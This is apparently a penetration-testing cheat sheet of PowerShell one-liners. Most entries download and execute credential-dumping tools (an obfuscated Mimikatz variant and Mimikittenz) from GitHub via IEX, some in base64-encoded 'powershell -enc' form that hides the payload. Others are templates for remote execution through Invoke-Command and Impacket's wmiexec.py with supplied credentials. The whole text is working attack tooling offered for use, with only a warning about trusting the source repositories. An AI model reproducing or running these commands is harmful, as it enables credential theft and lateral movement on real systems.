*NOTE - These pull from public GitHub Repos that are not under my control. Make sure you trust the content (or better yet, make your own fork) prior to using!*

#mimikatz [local]
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/cyber-rangers/PoCs/main/Credentials/cyb3r-mimi-ob.ps1"); Invoke-Cyb3rMimi -Command privilege::debug; Invoke-Cyb3rMimi -DumpCreds;

#encoded-mimikatz [local]
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwB5AGIAZQByAC0AcgBhAG4AZwBlAHIAcwAvAFAAbwBDAHMALwBtAGEAaQBuAC8AQwByAGUAZABlAG4AdABpAGEAbABzAC8AYwB5AGIAMwByAC0AbQBpAG0AaQAtAG8AYgAuAHAAcwAxACIAKQA7ACAASQBuAHYAbwBrAGUALQBDAHkAYgAzAHIATQBpAG0AaQAgAC0AQwBvAG0AbQBhAG4AZAAgAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAOwAgAEkAbgB2AG8AawBlAC0AQwB5AGIAMwByAE0AaQBtAGkAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA

#ps remoting [remote]
Invoke-Command -ComputerName <IP-Address> -ScriptBlock {powershell etc...}

#impacket's wmiexec.py [remote]
wmiexec.py <USER:PASSWORD@IP-Address> "powershell -enc powershell etc..."

#mimikittenz [local]
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz

#encoded-mimikittenz [local]
powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==







